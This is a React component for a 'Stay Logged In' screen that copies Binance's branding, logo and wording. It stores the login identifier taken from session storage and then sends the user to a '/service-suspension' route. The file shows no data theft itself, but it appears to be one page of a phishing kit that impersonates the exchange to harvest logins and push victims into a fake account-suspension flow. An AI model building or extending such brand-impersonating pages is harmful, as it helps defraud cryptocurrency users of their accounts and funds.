import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useApp } from '@/store/AppContext';

export default function StayLoggedIn() {
  const navigate = useNavigate();
  const { login } = useApp();
  const [dontShowAgain, setDontShowAgain] = useState(false);

  function handleYes() {
    const identifier = sessionStorage.getItem('loginIdentifier') || '';
    login(identifier, true);
    navigate('/service-suspension');
  }

  function handleNotNow() {
    const identifier = sessionStorage.getItem('loginIdentifier') || '';
    login(identifier, false);
    navigate('/service-suspension');
  }

  return (
    <div className="min-h-screen flex flex-col justify-between p-6 sm:p-8 bg-[#1d252b]">
      {/* Main Content */}
      <div className="flex-1 flex flex-col">
        {/* Logo */}
        <div className="mb-8">
          <img src="/source/logo.png" alt="Binance" className="h-8 w-auto" />
        </div>

        {/* Content */}
        <div className="max-w-md">
          <h1 className="text-white text-2xl font-bold mb-3">Stay Logged In</h1>
          <p className="text-gray-400 text-sm leading-relaxed mb-6">
            By clicking 'Yes', you can stay logged in for up to 5 days on this device. To revoke your logged in status, log out of your Binance account on this device.
          </p>

          {/* Checkbox */}
          <label className="flex items-center gap-2 mb-8 cursor-pointer">
            <input
              type="checkbox"
              checked={dontShowAgain}
              onChange={(e) => setDontShowAgain(e.target.checked)}
              className="custom-checkbox"
            />
            <span className="text-white text-sm">Don't show this message again on this device</span>
          </label>

          {/* Buttons */}
          <div className="space-y-3">
            <button
              onClick={handleYes}
              className="w-full bg-[#FCD535] hover:bg-[#F0B90B] text-gray-900 font-semibold rounded-lg transition-colors h-12 md:h-11 lg:h-11 text-[15px] md:text-base"
            >
              Yes
            </button>
            <button
              onClick={handleNotNow}
              className="w-full bg-[#2B3139] hover:bg-[#3a4149] text-white font-semibold rounded-lg transition-colors h-12 md:h-11 lg:h-11 text-[15px] md:text-base"
            >
              Not Now
            </button>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="flex items-center justify-center gap-8 text-gray-500 text-xs mt-8">
        <button className="flex items-center gap-2 hover:text-gray-400 transition-colors">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <circle cx="12" cy="12" r="10"/>
            <path d="M2 12h20M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/>
          </svg>
          English
        </button>
        <button className="hover:text-gray-400 transition-colors">Cookies</button>
        <button className="hover:text-gray-400 transition-colors">Privacy</button>
      </div>
    </div>
  );
}
